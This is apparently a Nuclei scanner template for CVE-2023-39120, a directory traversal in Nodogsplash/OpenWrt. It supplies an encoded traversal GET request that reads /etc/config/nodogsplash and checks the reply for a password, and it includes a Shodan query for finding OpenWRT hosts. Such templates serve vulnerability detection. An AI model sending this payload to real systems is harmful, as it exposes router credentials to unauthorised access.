id: CVE-2023-39120

info:
  name: Nodogsplash - Directory Traversal
  author: Numan TÃ¼rle
  severity: high
  description: |
    Nodogsplash product was affected by a directory traversal vulnerability that also impacted the OpenWrt product. This vulnerability was addressed in Nodogsplash version 5.0.1. Exploiting this vulnerability, remote attackers could read arbitrary files from the target system.
  impact: |
    An attacker can exploit this vulnerability to view, modify, or delete sensitive files on the system, potentially leading to unauthorized access, data leakage, or system compromise.
  remediation: Upgrade to the latest version to mitigate this vulnerability.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-39120
    - https://github.com/nodogsplash/nodogsplash/commit/a745a5d635925d2a6f0e0530bdc0eac645b672ed
    - https://gist.github.com/numanturle/55cb758bacc4930a081e79c2a6a769b6
    - https://github.com/openwrt/routing/pull/997
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2023-39120
    cwe-id: CWE-22
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"OpenWRT"
  tags: cve2023,cve,lfi,openwrt,nodogsplash,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/config/nodogsplash"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "nodogsplash"
          - "password"
        condition: and

      - type: word
        part: header
        words:
          - "application/octet-stream"

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100cabde20c3a108750151adb7798aaa3b24355b5eb2aa33165bd2d2c1456064da0022100d6225d69884a37ae38a065c4b4e7c2c1bcee653ee6b18ad529884f0a633a5978:922c64590222798bb761d5b6d8e72950